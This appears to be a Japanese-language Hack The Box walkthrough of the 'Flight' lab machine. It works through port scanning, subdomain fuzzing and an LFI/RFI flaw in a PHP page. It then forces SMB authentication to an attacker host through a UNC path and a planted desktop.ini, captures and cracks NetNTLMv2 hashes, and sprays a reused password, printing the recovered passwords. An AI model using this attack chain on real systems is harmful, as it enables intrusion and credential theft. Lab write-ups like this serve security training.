## STEP 1
```sh
└─$ rustscan -a 10.129.200.222 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.200.222:53
Open 10.129.200.222:80
Open 10.129.200.222:88
Open 10.129.200.222:135
Open 10.129.200.222:139
Open 10.129.200.222:389
Open 10.129.200.222:445
Open 10.129.200.222:464
Open 10.129.200.222:593
Open 10.129.200.222:636
Open 10.129.200.222:3268
Open 10.129.200.222:3269
Open 10.129.200.222:9389
Open 10.129.200.222:49667
Open 10.129.200.222:49673
Open 10.129.200.222:49674
Open 10.129.200.222:49695
Open 10.129.200.222:49725
10.129.200.222 -> [53,80,88,135,139,389,445,464,593,636,3268,3269,9389,49667,49673,49674,49695,49725]
```


## STEP 2
ドメイン名取得
```sh
└─$ netexec smb 10.129.200.222                                                                                     
SMB         10.129.200.222  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
```
hosts編集
```sh
└─$  echo '10.129.200.222 flight.htb' | sudo tee -a /etc/hosts
10.129.200.222 flight.htb
```
80番にアクセス  
めぼしい情報は特になし  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Flight_01.png">  
サブドメイン列挙  
別ウェブページを探索するため、サイズが異なるレスポンスを実施するドメインを調査
```sh
└─$ curl http://flight.htb -I
HTTP/1.1 200 OK
Date: Tue, 14 Oct 2025 08:07:10 GMT
Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
Last-Modified: Thu, 24 Feb 2022 05:58:10 GMT
ETag: "1b9d-5d8bd444f0080"
Accept-Ranges: bytes
Content-Length: 7069
Content-Type: text/html
```
schoolというサブドメイン発見
```sh
└─$ ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H 'Host: FUZZ.flight.htb' -u http://10.129.200.222 -fs 7069

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.200.222
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.flight.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 7069
________________________________________________

school                  [Status: 200, Size: 3996, Words: 1045, Lines: 91, Duration: 286ms]
:: Progress: [19966/19966] :: Job [1/1] :: 129 req/sec :: Duration: [0:02:22] :: Errors: 0 ::
```
hosts追加
```sh
└─$ tail -n 1 /etc/hosts
10.129.200.222 flight.htb school.flight.htb
```


## STEP 3
school.flight.htbにアクセス  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Flight_02.png">  
ページ内の「Home」「About Us」「Blog」にそれぞれリンクが設定されていた  
```sh
http://school.flight.htb/index.php?view=home.html
http://school.flight.htb/index.php?view=about.html
http://school.flight.htb/index.php?view=blog.html
```
「About Us」「Blog」にアクセス、ページの１部分がファイルインクルード処理で変更されていことが分かる  
phpでファイルインクルード処理を実施しているが、lfiまたはrfiの脆弱性があるかも
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Flight_03.png">  
レスポンスサイズ「1102」（ファイルが存在しない場合）はフィルタしてfuzzing  
lfiの脆弱性を確認！
```sh
└─$ ffuf -c -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt -u 'http://school.flight.htb/index.php?view=FUZZ' -fs 1102     

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://school.flight.htb/index.php?view=FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 1102
________________________________________________

C:/Windows/win.ini      [Status: 200, Size: 1194, Words: 149, Lines: 38, Duration: 493ms]
C:/WINDOWS/System32/drivers/etc/hosts [Status: 200, Size: 1926, Words: 315, Lines: 52, Duration: 493ms]
C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml [Status: 200, Size: 45670, Words: 8921, Lines: 700, Duration: 257ms]
c:/xampp/phpMyAdmin/config.inc.php [Status: 200, Size: 3153, Words: 274, Lines: 92, Duration: 259ms]
c:/xampp/sendmail/sendmail.ini [Status: 200, Size: 3198, Words: 431, Lines: 103, Duration: 254ms]
C:/xampp/apache/logs/access.log [Status: 200, Size: 263632, Words: 24083, Lines: 1638, Duration: 258ms]
C:/xampp/apache/logs/error.log [Status: 200, Size: 264345, Words: 28206, Lines: 1168, Duration: 262ms]
c:/xampp/apache/conf/httpd.conf [Status: 200, Size: 22337, Words: 2849, Lines: 597, Duration: 251ms]
c:/WINDOWS/system32/drivers/etc/protocol [Status: 200, Size: 2460, Words: 588, Lines: 58, Duration: 252ms]
c:/WINDOWS/system32/drivers/etc/lmhosts.sam [Status: 200, Size: 4785, Words: 771, Lines: 110, Duration: 252ms]
c:/WINDOWS/system32/drivers/etc/networks [Status: 200, Size: 1509, Words: 231, Lines: 47, Duration: 254ms]
c:/WINDOWS/system32/drivers/etc/hosts [Status: 200, Size: 1926, Words: 315, Lines: 52, Duration: 258ms]
c:/xampp/php/php.ini    [Status: 200, Size: 75093, Words: 9638, Lines: 2026, Duration: 254ms]
c:/WINDOWS/WindowsUpdate.log [Status: 200, Size: 1378, Words: 173, Lines: 35, Duration: 263ms]
c:/WINDOWS/system32/drivers/etc/services [Status: 200, Size: 18737, Words: 8656, Lines: 318, Duration: 257ms]
c:/xampp/apache/logs/error.log [Status: 200, Size: 283597, Words: 30173, Lines: 1239, Duration: 290ms]
c:/xampp/apache/logs/access.log [Status: 200, Size: 279512, Words: 25586, Lines: 1747, Duration: 295ms]
:: Progress: [236/236] :: Job [1/1] :: 62 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```
php.iniを確認、[リンク](https://web.archive.org/web/20240418085821/https://qiita.com/satorunooshie/items/39eda7b6a41909e89d29#allow_url_include)を参照  
allow_url_fopenが有効のためリモートファイルの読み込みは可能だが、allow_url_includeが無効のため実行はできないもよう
```sh
└─$ curl -s 'http://school.flight.htb/index.php?view=c:/xampp/php/php.ini' | grep 'allow_url_include\|allow_url_fopen'
allow_url_fopen = On
allow_url_include = Off
```
脆弱なindex.phpのソースコードをlfiで確認  
viewのパラメータに「..」や「//」などが含まれるとGET拒否される仕組み
```php
└─$ curl 'http://school.flight.htb/index.php?view=index.php'                           
<!DOCTYPE html>

~~~

<?php if (!isset($_GET['view']) || $_GET['view'] == "home.html") { ?>
    <div id="tagline">
      <div>
        <h4>Cum Sociis Nat PENATIBUS</h4>
        <p>Aenean leo nunc, fringilla a viverra sit amet, varius quis magna. Nunc vel mollis purus.</p>
      </div>
    </div>
<?php } ?>
  </div>
<?php

ini_set('display_errors', 0);
error_reporting(E_ERROR | E_WARNING | E_PARSE); 

if(isset($_GET['view'])){
$file=$_GET['view'];
if ((strpos(urldecode($_GET['view']),'..')!==false)||
    (strpos(urldecode(strtolower($_GET['view'])),'filter')!==false)||
    (strpos(urldecode($_GET['view']),'\\')!==false)||
    (strpos(urldecode($_GET['view']),'htaccess')!==false)||
    (strpos(urldecode($_GET['view']),'.shtml')!==false)
){
    echo "<h1>Suspicious Activity Blocked!";
    echo "<h3>Incident will be reported</h3>\r\n";
}else{
    echo file_get_contents($_GET['view']);
}
}else{
    echo file_get_contents("C:\\xampp\\htdocs\\school.flight.htb\\home.html");
}

?>

~~~
```
GET拒否されるviewパラメータを回避して、kaliのresponderに対するrfi実施  
rfiによってkaliのresponderにsmbアクセス・強制認証によりクレデンシャルを取得する
```sh
└─$ curl 'http://school.flight.htb/index.php?view=//10.10.16.4/share/a.txt'
```
flight\svc_apacheのntlmv2ハッシュ値を取得成功！
```sh
─$ sudo responder -I tun0 -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.4]
    Responder IPv6             [dead:beef:4::1002]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-SXXGVN35NIR]
    Responder Domain Name      [K6XI.LOCAL]
    Responder DCE-RPC Port     [47985]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...                                                                                                                                                                                                                 

[SMB] NTLMv2-SSP Client   : 10.129.238.60
[SMB] NTLMv2-SSP Username : flight\svc_apache
[SMB] NTLMv2-SSP Hash     : svc_apache::flight:7480e093cd0cc6d2:875288C3E4026DC8AF430F72BFABE029:010100000000000080D13ECEDB3CDC01BAFA2B06278EC63E00000000020008004B0036005800490001001E00570049004E002D00530058005800470056004E00330035004E004900520004003400570049004E002D00530058005800470056004E00330035004E00490052002E004B003600580049002E004C004F00430041004C00030014004B003600580049002E004C004F00430041004C00050014004B003600580049002E004C004F00430041004C000700080080D13ECEDB3CDC0106000400020000000800300030000000000000000000000000300000E49FE70A59898E7F8BD0DFAACAC25A27200865B470E26F8E5D5FFA5FA56151400A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0034000000000000000000
```
取得したntlmv2ハッシュをクラック成功！
パスワード、S@Ss!K@*t13を取得
```sh
└─$ name-that-hash -f svc_apache.txt --no-banner
svc_apache::flight:7480e093cd0cc6d2:875288C3E4026DC8AF430F72BFABE029:010100000000000080D13ECEDB3CDC01BAFA2B06278EC63E00000000020008004B0036005800490001001E00570049004E002D00530058005800470056004E00330035004E004900520004003400570049004E0
02D00530058005800470056004E00330035004E00490052002E004B003600580049002E004C004F00430041004C00030014004B003600580049002E004C004F00430041004C00050014004B003600580049002E004C004F00430041004C000700080080D13ECEDB3CDC0106000400020000000800300
030000000000000000000000000300000E49FE70A59898E7F8BD0DFAACAC25A27200865B470E26F8E5D5FFA5FA56151400A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0034000000000000000000

Most Likely 
NetNTLMv2, HC: 5600 JtR: netntlmv2
```
```sh
└─$ hashcat -a 0 -m 5600 svc_apache.txt /usr/share/wordlists/rockyou.txt --quiet
SVC_APACHE::flight:7480e093cd0cc6d2:875288c3e4026dc8af430f72bfabe029:010100000000000080d13ecedb3cdc01bafa2b06278ec63e00000000020008004b0036005800490001001e00570049004e002d00530058005800470056004e00330035004e004900520004003400570049004e002d00530058005800470056004e00330035004e00490052002e004b003600580049002e004c004f00430041004c00030014004b003600580049002e004c004f00430041004c00050014004b003600580049002e004c004f00430041004c000700080080d13ecedb3cdc0106000400020000000800300030000000000000000000000000300000e49fe70a59898e7f8bd0dfaacac25a27200865b470e26f8e5d5ffa5fa56151400a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0034000000000000000000:S@Ss!K@*t13
```


## STEP 4
smb列挙  
readできるフォルダにめぼしい情報はなかった
```sh
└─$ netexec smb 10.129.200.222 -u 'flight.htb\svc_apache' -p 'S@Ss!K@*t13' --shares                
SMB         10.129.200.222  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) 
SMB         10.129.200.222  445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         10.129.200.222  445    G0               [*] Enumerated shares
SMB         10.129.200.222  445    G0               Share           Permissions     Remark
SMB         10.129.200.222  445    G0               -----           -----------     ------
SMB         10.129.200.222  445    G0               ADMIN$                          Remote Admin
SMB         10.129.200.222  445    G0               C$                              Default share
SMB         10.129.200.222  445    G0               IPC$            READ            Remote IPC
SMB         10.129.200.222  445    G0               NETLOGON        READ            Logon server share 
SMB         10.129.200.222  445    G0               Shared          READ            
SMB         10.129.200.222  445    G0               SYSVOL          READ            Logon server share 
SMB         10.129.200.222  445    G0               Users           READ            
SMB         10.129.200.222  445    G0               Web             READ
```
ユーザ列挙
```sh
└─$ netexec smb 10.129.200.222 -u 'flight.htb\svc_apache' -p 'S@Ss!K@*t13' --users-export users.txt
SMB         10.129.200.222  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) 
SMB         10.129.200.222  445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         10.129.200.222  445    G0               -Username-                    -Last PW Set-       -BadPW- -Description-                                            
SMB         10.129.200.222  445    G0               Administrator                 2022-09-22 20:17:02 0       Built-in account for administering the computer/domain 
SMB         10.129.200.222  445    G0               Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.200.222  445    G0               krbtgt                        2022-09-22 19:48:01 0       Key Distribution Center Service Account 
SMB         10.129.200.222  445    G0               S.Moon                        2022-09-22 20:08:22 0       Junion Web Developer 
SMB         10.129.200.222  445    G0               R.Cold                        2022-09-22 20:08:22 0       HR Assistant 
SMB         10.129.200.222  445    G0               G.Lors                        2022-09-22 20:08:22 0       Sales manager 
SMB         10.129.200.222  445    G0               L.Kein                        2022-09-22 20:08:22 0       Penetration tester 
SMB         10.129.200.222  445    G0               M.Gold                        2022-09-22 20:08:22 0       Sysadmin 
SMB         10.129.200.222  445    G0               C.Bum                         2022-09-22 20:08:22 0       Senior Web Developer 
SMB         10.129.200.222  445    G0               W.Walker                      2022-09-22 20:08:22 0       Payroll officer 
SMB         10.129.200.222  445    G0               I.Francis                     2022-09-22 20:08:22 0       Nobody knows why he's here 
SMB         10.129.200.222  445    G0               D.Truff                       2022-09-22 20:08:22 0       Project Manager 
SMB         10.129.200.222  445    G0               V.Stevens                     2022-09-22 20:08:22 0       Secretary 
SMB         10.129.200.222  445    G0               svc_apache                    2022-09-22 20:08:23 0       Service Apache web 
SMB         10.129.200.222  445    G0               O.Possum                      2022-09-22 20:08:23 0       Helpdesk 
SMB         10.129.200.222  445    G0               [*] Enumerated 15 local users: flight
SMB         10.129.200.222  445    G0               [*] Writing 15 local users to users.txt
```
svc_apacheパスワードの使いまわし調査  
s.moonが使いまわしていることを確認
```sh
└─$ netexec smb 10.129.200.222 -u users.txt -p 'S@Ss!K@*t13' --continue-on-success
SMB         10.129.200.222  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) 
SMB         10.129.200.222  445    G0               [-] flight.htb\Administrator:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.200.222  445    G0               [-] flight.htb\Guest:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.200.222  445    G0               [-] flight.htb\krbtgt:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.200.222  445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
SMB         10.129.200.222  445    G0               [-] flight.htb\R.Cold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.200.222  445    G0               [-] flight.htb\G.Lors:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.200.222  445    G0               [-] flight.htb\L.Kein:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.200.222  445    G0               [-] flight.htb\M.Gold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.200.222  445    G0               [-] flight.htb\C.Bum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.200.222  445    G0               [-] flight.htb\W.Walker:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.200.222  445    G0               [-] flight.htb\I.Francis:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.200.222  445    G0               [-] flight.htb\D.Truff:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.200.222  445    G0               [-] flight.htb\V.Stevens:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.200.222  445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         10.129.200.222  445    G0               [-] flight.htb\O.Possum:S@Ss!K@*t13 STATUS_LOGON_FAILURE
```


## STEP 5
s.moonユーザでsmb列挙  
sharedにwrite権限が付与されることを確認
```sh
└─$ netexec smb 10.129.200.222 -u 'flight.htb\s.moon' -p 'S@Ss!K@*t13' --shares
SMB         10.129.200.222  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) 
SMB         10.129.200.222  445    G0               [+] flight.htb\s.moon:S@Ss!K@*t13 
SMB         10.129.200.222  445    G0               [*] Enumerated shares
SMB         10.129.200.222  445    G0               Share           Permissions     Remark
SMB         10.129.200.222  445    G0               -----           -----------     ------
SMB         10.129.200.222  445    G0               ADMIN$                          Remote Admin
SMB         10.129.200.222  445    G0               C$                              Default share
SMB         10.129.200.222  445    G0               IPC$            READ            Remote IPC
SMB         10.129.200.222  445    G0               NETLOGON        READ            Logon server share 
SMB         10.129.200.222  445    G0               Shared          READ,WRITE      
SMB         10.129.200.222  445    G0               SYSVOL          READ            Logon server share 
SMB         10.129.200.222  445    G0               Users           READ            
SMB         10.129.200.222  445    G0               Web             READ
```
write可能フォルダ内のファイルにユーザがアクセスすると仮定した際の攻撃を考える  
kaliにsmb認証を要求するファイルにアクセスした際、responder経由でユーザの認証リクエストを取得できる  
リモートリソースにアクセスする設定が可能なファイルはいくつかあるか、今回はdesktop.iniを使用する
```sh
└─$ git clone -q https://github.com/Greenwolf/ntlm_theft.git

└─$ python3.13 ntlm_theft/ntlm_theft.py -g desktopini -s 10.10.16.4 -f test
/home/kali/htb/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence '\l'
  location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
Created: test/desktop.ini (BROWSE TO FOLDER)
Generation Complete.
                                                                                                                                                                       
└─$ cat test/desktop.ini 
[.ShellClassInfo]
IconResource=\\10.10.16.4\aa 
```
sharedに作成したdesktop.iniを投下
```sh
└─$ netexec smb 10.129.200.222 -u 'flight.htb\s.moon' -p 'S@Ss!K@*t13' --share Shared --put-file '/home/kali/test/desktop.ini' '/desktop.ini'
SMB         10.129.200.222  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) 
SMB         10.129.200.222  445    G0               [+] flight.htb\s.moon:S@Ss!K@*t13 
SMB         10.129.200.222  445    G0               [*] Copying /home/kali/test/desktop.ini to /desktop.ini
SMB         10.129.200.222  445    G0               [+] Created file /home/kali/test/desktop.ini on \\Shared\/desktop.ini
```
responderでsmb認証をキャプチャ  
c.bumのntlmv2ハッシュを取得成功！
```sh
└─$ sudo responder -I tun0 -v
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.4]
    Responder IPv6             [dead:beef:4::1002]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-6DYRA9SLDQC]
    Responder Domain Name      [ZFPM.LOCAL]
    Responder DCE-RPC Port     [46980]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...                                                                                                                                            

[SMB] NTLMv2-SSP Client   : 10.129.200.222
[SMB] NTLMv2-SSP Username : flight.htb\c.bum
[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:40702e4077420c0e:394C704F40664B2DC0D4C9FB23557E61:01010000000000000009CD3E433DDC01D93AED061CB69BDE00000000020008005A00460050004D0001001E00570049004E002D0036004400590052004100390053004C0044005100430004003400570049004E002D0036004400590052004100390053004C004400510043002E005A00460050004D002E004C004F00430041004C00030014005A00460050004D002E004C004F00430041004C00050014005A00460050004D002E004C004F00430041004C00070008000009CD3E433DDC0106000400020000000800300030000000000000000000000000300000CE4B0228DBB7891B107A33DF935AFC90D4D951B1C353270577762DA1378815910A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0034000000000000000000
```
クラック成功！  
c.bumのパスワードは「Tikkycoll_431012284」
```sh
└─$ hashcat -a 0 -m 5600 c.bum.txt /usr/share/wordlists/rockyou.txt --quiet     
C.BUM::flight.htb:40702e4077420c0e:394c704f40664b2dc0d4c9fb23557e61:01010000000000000009cd3e433ddc01d93aed061cb69bde00000000020008005a00460050004d0001001e00570049004e002d0036004400590052004100390053004c0044005100430004003400570049004e002d0036004400590052004100390053004c004400510043002e005a00460050004d002e004c004f00430041004c00030014005a00460050004d002e004c004f00430041004c00050014005a00460050004d002e004c004f00430041004c00070008000009cd3e433ddc0106000400020000000800300030000000000000000000000000300000ce4b0228dbb7891b107a33df935afc90d4d951b1c353270577762da1378815910a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0034000000000000000000:Tikkycoll_431012284
```
